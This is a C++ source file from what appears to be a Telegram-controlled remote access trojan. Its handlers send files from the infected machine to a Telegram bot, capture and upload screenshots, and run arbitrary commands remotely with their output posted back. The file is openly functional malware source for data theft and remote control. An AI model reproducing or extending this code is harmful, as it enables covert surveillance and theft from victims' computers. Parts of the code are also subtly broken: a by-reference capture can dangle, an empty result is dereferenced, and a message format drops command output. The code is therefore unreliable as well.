/*rat_handler/src/threaded_handler.cpp*/
#include "rat/Handler.hpp"
#include "rat/networking.hpp"
#include "rat/system.hpp"
#include "rat/media.hpp"
#include <algorithm>
#include <chrono>
#include <mutex>
#include <optional>
#include <thread>
#include <fmt/core.h>
#include <fmt/chrono.h>
#include <string>
#include <boost/algorithm/string.hpp>
#include <memory>
#include "rat/process.hpp"

#include "rat/handler/debug.hpp"


namespace rat::handler {
constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB; 

constexpr uint8_t TIMEMOUT_FOR_FILEOPS = 255;
// Command handler implementations
/*This method cannot run asynchronously for big files because the upload will be interrupted from the https requests that are sent from the parent thread */

void Handler::handleGetCommand() {
    if (command.parameters.empty()) {
        this->bot->sendMessage("No file specified");
        return;
    }

    const auto file_path = rat::system::normalizePath(command.parameters[0]);
    if (!std::filesystem::exists(file_path)) {
        this->bot->sendMessage(fmt::format("File does not exist: {}", file_path.string()));
        return;
    }
    
    const size_t file_size = std::filesystem::file_size(file_path);
    DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);

    if (file_size < 2 * 1024 * KB) {
        // small file → sync
        this->bot->sendFile(file_path);
    } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
        // medium file → async via thread pool
        this->long_process_pool->enqueue([this, &file_path] {
            
            DEBUG_LOG("Async upload {}", file_path.string());
            std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
            this->backing_bot->sendMessage(fmt::format("File: {} will be uploaded", file_path.string()));
            auto resp = this->backing_bot->sendFile(file_path);
            
            if (resp != rat::tbot::BotResponse::SUCCESS) {
                ERROR_LOG("Failed to upload {}", file_path.string());
            }
        });
    } else {
        this->bot->sendMessage(fmt::format(
            "File too big for Telegram (max 50 MB or /get method 2MB), this one is {}",
            file_size
        ));
    }
}

void Handler::handleScreenshotCommand() {
    auto image_path = std::filesystem::path(
        fmt::format("{}.png", rat::system::getCurrentDateTime_Underscored())
        );
    this->short_process_pool->enqueue([this, image_path] {
        std::string output_buffer;
        bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
        
        std::lock_guard<std::mutex> lock(backing_bot_mutex);

        if (success && std::filesystem::exists(image_path)) {
            DEBUG_LOG("{} taken", image_path.string());

            if (this->backing_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                ERROR_LOG("Failed uploading {}", image_path.string());
            }
        }
        if (!output_buffer.empty()) {
            this->backing_bot->sendMessage(output_buffer);
        }
        rat::system::removeFile(image_path);
    });

    this->bot->sendMessage("Screenshot command launched.");
}

void Handler::parseAndHandleProcessCommand() {
    std::string message_text = this->telegram_update->message.text;
    if (message_text.size() <= 9) return;
    message_text.erase(0, 9); // remove "/process "
    boost::trim(message_text);

    size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
    if (space_pos == std::string::npos) {
        this->bot->sendMessage("Invalid command format");
        return;
    }

    std::string timeout_str = message_text.substr(0, space_pos);
    message_text.erase(0, space_pos);
    boost::trim(message_text);

    int timeout = 0;
    try {
        timeout = std::stoi(timeout_str);
        if (timeout < 0) throw std::invalid_argument("negative");
    } catch (...) {
        this->bot->sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
        return;
    }
    ::rat::threading::ThreadPool* p_process_pool; 
    if (timeout > 4000 || this->short_process_pool->getPendingWorkersCount() > 1) {
      
        p_process_pool = this->long_process_pool.get(); 
    }else {
        p_process_pool = this->short_process_pool.get();
    }
    auto process_lambda = [this](std::optional<::rat::process::ProcessResult> result) {
            std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
            if (result) {
                this->backing_bot->sendMessage(
                fmt::format("Exit: {}\nSTDOUT:\nSTDERR:{}", result->exit_code, result->stdout_str, result->stderr_str)
              );
            } else {
                this->backing_bot->sendMessage(fmt::format("Process timed out or failed\n STDERR:{}", result->stderr_str));
            }
        };
 
    ::rat::process::ProcessContext process_context = {
        .command = message_text,
        .timeout = std::chrono::milliseconds(timeout),
        .thread_pool = p_process_pool, // Assuming you have a thread_pool member
        .mutexes    =  std::nullopt,  // Assuming you have a vector of mutexes
        .secondary_thread_pool = this->secondary_helper_pool.get(),
        .callback = process_lambda
    };
    std::atomic<pid_t> process_id{-1};
    ::rat::process::runAsyncProcess(process_context, process_id);
    if(process_id.load() != -1) {
        this->bot->sendMessage(fmt::format("Process launched pid={}", process_id.load()));
    }

}
}//namespace rat::handler

#undef DEBUG_LOG
#undef ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
    #undef DEBUG_RAT_HANDLER
#endif
